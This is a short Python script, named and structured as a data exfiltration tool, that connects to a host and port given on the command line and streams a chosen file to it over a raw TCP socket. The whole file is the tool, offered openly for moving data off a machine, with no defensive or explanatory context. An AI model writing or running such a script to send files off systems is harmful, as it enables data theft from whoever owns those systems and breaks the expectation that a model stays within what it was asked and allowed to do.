#!/usr/bin/python

import socket
import sys


class Exfil:
    def __init__(self):
        self.buffer_size = 1024

    def _exfil(self, ip, port, ex_file):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            conn = sock.connect((ip, port))

            with open(ex_file, "rb") as f:
                file_bytes = f.read(self.buffer_size)

                while file_bytes:
                    sock.send(file_bytes)
                    file_bytes = f.read(self.buffer_size)

        except socket.error:
            sys.exit("Couldn't connect to server")

        finally:
            sock.close()

    def main(self):
        ip = sys.argv[1]
        port = int(sys.argv[2])
        file = sys.argv[3]

        self._exfil(ip, port, file)


if __name__ == '__main__':
    exfil = Exfil()
    exfil.main()
